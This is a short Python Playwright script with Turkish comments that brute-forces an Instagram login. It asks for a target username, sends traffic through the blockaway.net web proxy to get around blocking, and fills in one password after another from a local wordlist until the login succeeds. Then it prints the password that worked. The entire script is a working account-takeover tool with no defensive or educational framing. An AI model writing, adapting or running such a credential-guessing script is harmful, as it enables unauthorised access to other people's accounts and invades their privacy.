#Bu kodda VPN ile kalıclık sağlamaya çalıştım 
import time
from playwright.sync_api import sync_playwright

username = input("Lütfen kullanıcı adınızı giriniz: ")

def run(playwright) -> None:
    browser = playwright.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()
    page.goto("https://www.blockaway.net/_tr/")
    page.get_by_placeholder("Enter an URL or a search").click()
    page.get_by_placeholder("Enter an URL or a search").fill("instagram.com")
    page.get_by_placeholder("Enter an URL or a search").press("Enter")
    page.get_by_role("button", name="Tüm çerezlere izin ver").click()
    page.wait_for_selector("#__cpsHeader")

    page.click("#__cpsHeader")
    page.fill("input[name='username']", username)

    with open(r'C:\Users\Furkan\Desktop\password.txt') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        page.fill("input[name='password']", password)
        page.click("button[type='submit']")
        page.wait_for_load_state('networkidle')
        if page.url.startswith("https://www.instagram.com/"):
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Login unsuccessful with password: {password}")
            page.fill("input[name='password']", "")
            time.sleep(2)  # Şifre deneme arasında 2 saniye bekle

    time.sleep(10)

with sync_playwright() as playwright:
    run(playwright)
